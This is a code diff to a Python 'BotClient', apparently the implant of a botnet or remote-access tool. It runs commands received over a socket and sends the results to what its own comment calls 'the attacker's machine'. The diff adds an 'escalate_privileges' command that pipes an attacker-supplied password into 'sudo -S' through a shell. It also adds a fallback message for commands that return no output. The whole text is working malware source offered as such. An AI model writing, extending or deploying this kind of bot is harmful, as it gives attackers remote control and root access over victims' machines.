@@ -62,12 +62,28 @@ class BotClient:
                 command = (self.client_socket.recv(4064)).decode()
                 continue
             try:
+                if "escalate_privileges" == command.lower().strip():
+                    # execute the command then send a message asking for the password befoe executing the command
+                    self.client_socket.sendall("needpass".encode())
+                    password = (self.client_socket.recv(4064)).decode()
+                    # concatenate the password and the actual command
+                    command = f"echo {password} | sudo -S whoami > whoami.txt"
+
+                    # Execute the command in a shell context
+                    run(command, shell=True)
+
+                    continue
+
                 # create a subprocess using the run method and pass the command to the subprocess
                 result = run(command.split(" "), capture_output=True)
 
                 # get the result and error output from the completed process
                 output = result.stdout
                 error = result.stderr
+
+                # check for empty output or error
+                if not output and not error:
+                    output = f"command {command} executed successfully with no output".encode()
 
                 # send the result to the attacker's machine
                 self.client_socket.sendall(output)
